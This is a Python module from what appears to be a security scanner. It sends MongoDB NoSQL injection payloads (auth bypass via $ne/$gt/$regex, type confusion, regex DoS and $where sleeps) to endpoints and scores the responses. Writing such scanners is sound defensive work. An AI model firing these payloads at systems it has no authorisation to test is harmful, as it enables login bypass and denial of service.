"""MongoDB-specific NoSQL injection probes.

Covers operator injection, type confusion, regex DoS,
server-side JS execution via $where/$function, and timing analysis.
"""

from __future__ import annotations

import json
import re
import time
from typing import Any

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature

from ._confidence import probe_confidence, probe_severity

_MONGO_ERROR_RE = re.compile(
    r"(?i)(?:mongo|mongodb|bson|E11000|MongoError|MongoServerError|"
    r"CastError|QueryFailure|unrecognized\s*operator|unknown\s*top\s*level\s*operator|"
    r"\$where|\$function|\$accumulator|\$regex|\$ne|\$exists)"
)


_MONGO_AUTH_BYPASS_PAYLOADS: list[tuple[str, dict[str, Any]]] = [
    (
        "ne_null",
        {"username": {"$ne": None}, "password": {"$ne": None}},
    ),
    (
        "gt_empty",
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
    ),
    (
        "regex_all",
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    ),
    (
        "ne_empty",
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
    ),
    (
        "in_array",
        {"username": {"$in": ["admin", "root", "user"]}, "password": {"$ne": None}},
    ),
    (
        "regex_admin",
        {"username": {"$regex": "^admin"}, "password": {"$ne": None}},
    ),
    (
        "type_array",
        {"username": {"$type": "array"}, "password": {"$type": "array"}},
    ),
    (
        "type_object",
        {"username": {"$type": "object"}, "password": {"$type": "object"}},
    ),
]

_MONGO_TYPE_CONFUSION: list[tuple[str, dict[str, Any]]] = [
    ("eq_array", {"$eq": []}),
    ("eq_object", {"$eq": {}}),
    ("eq_null", {"$eq": None}),
    ("eq_true", {"$eq": True}),
    ("eq_false", {"$eq": False}),
    ("eq_zero", {"$eq": 0}),
    ("eq_negative", {"$eq": -1}),
]

_MONGO_REGEX_DOS: list[tuple[str, dict[str, Any]]] = [
    (
        "regex_backtrack",
        {"$where": "this.username.match(/^(a+)+$/)"},
    ),
    (
        "regex_repeat",
        {"$where": "this.email.match(/^(a|a?)+$/) == null"},
    ),
    (
        "regex_evil",
        {"$where": "this.name.match(/(a+)+$/)"},
    ),
]

_MONGO_SERVER_SIDE_JS: list[tuple[str, dict[str, Any]]] = [
    (
        "where_sleep",
        {"$where": "sleep(1000)"},
    ),
    (
        "where_print",
        {"$where": "print('test')"},
    ),
    (
        "where_global",
        {"$where": "globalThis.sleep(500)"},
    ),
]

_MONGO_SCHEMA_MAPPING: list[tuple[str, dict[str, Any]]] = [
    (
        "ne_exists",
        {"username": {"$ne": None}, "$where": "1"},
    ),
    (
        "ne_regex",
        {"username": {"$ne": None, "$regex": ".*"}, "password": {"$exists": True}},
    ),
    (
        "exists_false",
        {"username": {"$exists": False}},
    ),
]


def nosql_mongodb_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: Any,
    limit: int = 30,
    timing_threshold_ms: float = 3000.0,
) -> list[dict[str, Any]]:
    """MongoDB-specific NoSQL injection probes.

    Tests for:
    - Authentication bypass via $ne, $gt, $regex, $in
    - Type confusion via {$eq: []}, {$eq: {}}
    - Regex DoS via catastrophic backtracking in $where
    - Server-side JS execution via $where/$function
    - Schema mapping via $ne + $exists combinations
    - Timing side-channel on $where sleeps

    Args:
        priority_urls: List of URL dicts.
        response_cache: HTTP response cache.
        limit: Maximum findings.
        timing_threshold_ms: Response time threshold for timing anomalies.

    Returns:
        List of MongoDB NoSQL injection findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    all_payloads: list[tuple[str, dict[str, Any], str]] = []

    for payload_name, payload_body in _MONGO_AUTH_BYPASS_PAYLOADS:
        all_payloads.append((payload_name, payload_body, "auth_bypass"))

    for payload_name, payload_body in _MONGO_TYPE_CONFUSION:
        all_payloads.append((payload_name, payload_body, "type_confusion"))

    for payload_name, payload_body in _MONGO_REGEX_DOS:
        all_payloads.append((payload_name, payload_body, "regex_dos"))

    for payload_name, payload_body in _MONGO_SERVER_SIDE_JS:
        all_payloads.append((payload_name, payload_body, "server_side_js"))

    for payload_name, payload_body in _MONGO_SCHEMA_MAPPING:
        all_payloads.append((payload_name, payload_body, "schema_mapping"))

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break

        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        baseline = response_cache.get(url)
        baseline_status = int(baseline.get("status_code") or 0) if baseline else 0
        baseline_len = len(str(baseline.get("body_text") or "")) if baseline else 0

        baseline_times: list[float] = []
        for _ in range(3):
            b = response_cache.get(url)
            if b and b.get("response_time_ms"):
                baseline_times.append(float(b["response_time_ms"]))
        avg_baseline_time = sum(baseline_times) / len(baseline_times) if baseline_times else 200.0

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []
        timing_samples: list[dict[str, Any]] = []

        for payload_name, payload_body, category in all_payloads:
            if len(url_probes) >= 4:
                break

            is_timing_payload = category == "server_side_js"

            start = time.perf_counter()
            response = response_cache.request(
                url,
                method="POST",
                headers={
                    "Cache-Control": "no-cache",
                    "Content-Type": "application/json",
                    "X-NoSQL-Mongo-Probe": "1",
                },
                body=json.dumps(payload_body),
            )
            elapsed_ms = (time.perf_counter() - start) * 1000.0

            if not response:
                continue

            body = str(response.get("body_text", "") or "")[:8000]
            status = int(response.get("status_code") or 0)
            response_len = len(body)
            error_match = _MONGO_ERROR_RE.search(body)

            issues_for_hit: list[str] = []

            if baseline_status in (401, 403) and status == 200:
                issues_for_hit.append("mongodb_auth_bypass")
            elif error_match:
                issues_for_hit.append("mongodb_error_pattern")

            if category == "type_confusion":
                issues_for_hit.append("mongodb_type_confusion")
            elif category == "regex_dos":
                issues_for_hit.append("mongodb_regex_dos")
            elif category == "server_side_js":
                issues_for_hit.append("mongodb_server_side_js")
            elif category == "schema_mapping":
                issues_for_hit.append("mongodb_schema_mapping")

            if is_timing_payload and elapsed_ms > timing_threshold_ms:
                issues_for_hit.append("mongodb_timing_side_channel")

            if status != baseline_status and status < 500:
                issues_for_hit.append("mongodb_response_divergence")
            elif abs(response_len - baseline_len) > baseline_len * 0.5 and baseline_len > 0:
                issues_for_hit.append("mongodb_response_divergence")

            if issues_for_hit:
                url_issues.extend(issues_for_hit)
                probe_data: dict[str, Any] = {
                    "payload_type": payload_name,
                    "category": category,
                    "payload": payload_body,
                    "baseline_status": baseline_status,
                    "response_status": status,
                    "baseline_length": baseline_len,
                    "response_length": response_len,
                    "response_time_ms": round(elapsed_ms, 2),
                    "baseline_avg_ms": round(avg_baseline_time, 2),
                    "issues": issues_for_hit,
                    "error_pattern": error_match.group(0) if error_match else None,
                }

                if is_timing_payload:
                    timing_samples.append(probe_data)

                url_probes.append(probe_data)

        if url_probes:
            unique_issues = list(dict.fromkeys(url_issues))
            finding: dict[str, Any] = {
                "url": url,
                "endpoint_key": endpoint_key,
                "endpoint_base_key": endpoint_base_key(url),
                "endpoint_type": classify_endpoint(url),
                "issues": unique_issues,
                "probes": url_probes,
                "confidence": probe_confidence(unique_issues),
                "severity": probe_severity(unique_issues),
            }
            if timing_samples:
                finding["timing_analysis"] = {
                    "threshold_ms": timing_threshold_ms,
                    "samples": len(timing_samples),
                    "anomalous_count": sum(
                        1 for s in timing_samples if s["response_time_ms"] > timing_threshold_ms
                    ),
                }
            findings.append(finding)

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
